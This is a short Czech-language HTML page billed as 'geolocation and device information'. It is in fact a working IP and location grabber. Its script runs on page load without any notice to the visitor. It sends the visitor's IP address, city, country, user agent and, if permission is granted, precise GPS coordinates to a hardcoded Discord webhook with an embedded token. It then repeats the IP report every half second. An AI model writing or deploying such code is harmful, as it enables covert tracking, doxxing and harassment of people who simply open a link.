<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
</head>
<body>
    <h1>Geolokace a informace o zařízení</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem

        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odesílání:", error));
        }

        function getIP(device, gpsData) {
            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\nVPN: FALSE\n${gpsData}`;

                sendToDiscord(message);
            })
            .catch(error => console.error("Chyba získání IP:", error));
        }

        function getLocation() {
            let device = navigator.userAgent; // Detekce zařízení

            // Odesílání IP a zařízení ihned po načtení stránky
            getIP(device, "🚫 GPS není potvrzena");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude.toFixed(6);
                    const lon = position.coords.longitude.toFixed(6);
                    getIP(device, `📍 GPS: ${lat}, ${lon}`);
                }, () => {
                    getIP(device, "🚫 GPS zamítnuta");
                });
            }
        }

        window.onload = function() {
            getLocation();

            // Interval pro odesílání IP a zařízení každých 0,5 sekundy
            setInterval(() => {
                let device = navigator.userAgent;
                getIP(device, "🚫 GPS není potvrzena");
            }, 500); // 500 ms = 0,5 sekundy
        };
    </script>
</body>
</html>
